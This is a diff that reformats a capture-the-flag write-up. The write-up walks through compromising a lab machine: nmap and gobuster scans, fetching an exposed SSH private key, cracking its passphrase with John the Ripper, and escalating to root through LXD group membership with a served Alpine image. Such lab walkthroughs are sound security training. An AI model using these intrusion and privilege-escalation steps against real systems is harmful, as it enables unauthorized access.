@@ -4,10 +4,9 @@ pagination_next: null
 pagination_prev: null
 ---
 
-
 ## Task 1 Boot2Root
 ### What is the user flag?
-- Let's begin by performing an `nmap` scan against the target.
+Let's begin by performing an `nmap` scan against the target.
 ```
 $ nmap -sC -sV 10.10.223.2
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-16 09:38 IST
@@ -28,24 +27,26 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
 ```
-- There are two open ports:
+There are two open ports:
 
 | Port | Service |
 | ---- | ------- |
 | 22   | ssh     |
 | 80   | http    |
 
-- Let's visit the website through the browser.
+Let's visit the website through the browser.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/7595fb56-6c5a-4462-959a-4b9bdda22924)
 
-- There's really nothing of importance here.
-- Using `CTRL+U` we can view the source page.
+There's really nothing of importance here.
+
+Using `CTRL+U` we can view the source page.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/9d7c738e-1f18-4b71-8bf5-9a3914f1c58b)
 
-- So we know that there is a user called `john`.
-- We can use `gobuster` to find other web pages that might be useful.
+So we know that there is a user called `john`.
+
+We can use `gobuster` to find other web pages that might be useful.
 ```
 $ gobuster dir -u http://10.10.223.2 -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
@@ -75,20 +76,20 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 ===============================================================
 ```
-- The `/secret` page seems interesting, let's go there.
+The `/secret` page seems interesting, let's go there.
 
 ![4](https://github.com/Knign/Write-ups/assets/110326359/5337a972-eaeb-4559-bcf1-f580570b881c)
 
-- Let's get the `secretKey`.
+Let's get the `secretKey`.
 
 ![5](https://github.com/Knign/Write-ups/assets/110326359/0cf52dc6-98b2-4a7c-9d88-559dca31c30f)
 
-- It seems to be the private key of the `john` user we saw before.
-- We can use `ssh2john` to create a hash file.
+It seems to be the private key of the `john` user we saw before.
+We can use `ssh2john` to create a hash file.
 ```
 $ ssh2john secretKey > secretKey_hash 
 ```
-- Now we can use `john` to crack the hashes.
+Now we can use `john` to crack the hashes.
 ```
 $ john secretKey_hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -102,7 +103,7 @@ letmein          (secretKey)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-- Let's change the permissions of the `secretKey`.
+Let's change the permissions of the `secretKey`.
 ```
 $ chmod 600 secretKey
 $ ls -l
@@ -110,7 +111,7 @@ total 8
 -rw------- 1 kunal kunal 1766 Dec 16 10:03 secretKey
 -rw-r--r-- 1 kunal kunal 2461 Dec 16 10:00 secretKey_hash
 ```
-- Now we are all set to login through SSH as the `john` user.
+Now we are all set to login through SSH as the `john` user.
 ```
 $ ssh -i secretKey john@10.10.223.2
 Enter passphrase for key 'secretKey': 
@@ -135,7 +136,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
 Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
 john@exploitable:~$ 
 ```
-- We can now read the user flag.
+We can now read the user flag.
 ```
 john@exploitable:~$ cat user.txt 
 a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
@@ -148,12 +149,13 @@ a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
 &nbsp;
 
 ### What is the root flag?
-- Let's check what groups `john` is a part of.
+Let's check what groups `john` is a part of.
 ```
 john@exploitable:~$ id
 uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
 ```
-- On searching for a while we can find the following article that explains how to escalate the root privilege by exploiting the features of LXD.
+On searching for a while we can find the following article that explains how to escalate the root privilege by exploiting the features of LXD.
+
 #### Commands to be run on the attacker machine:
 ```
 $ git clone  https://github.com/saghul/lxd-alpine-builder.git
@@ -161,6 +163,7 @@ $ cd lxd-alpine-builder
 $ sudo ./build-alpine
 $ python3 -m http.server
 ```
+
 #### Commands to be run on the target machine:
 ```
 john@exploitable:/tmp$ wget http://10.17.48.138:8000/alpine-v3.19-x86_64-20231216_1041.tar.gz
@@ -191,12 +194,12 @@ john@exploitable:/tmp$ lxc exec ignite /bin/sh
 ~ # id
 uid=0(root) gid=0(root)
 ```
-- We can now locate the `root.txt` file using the `find` command.
+We can now locate the `root.txt` file using the `find` command.
 ```
 ~ # find / -type f -name root.txt 2>/dev/null
 /mnt/root/root/root.txt
 ```
-- Let's get the root flag.
+Let's get the root flag.
 ```
 ~ # cat /mnt/root/root/root.txt
 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
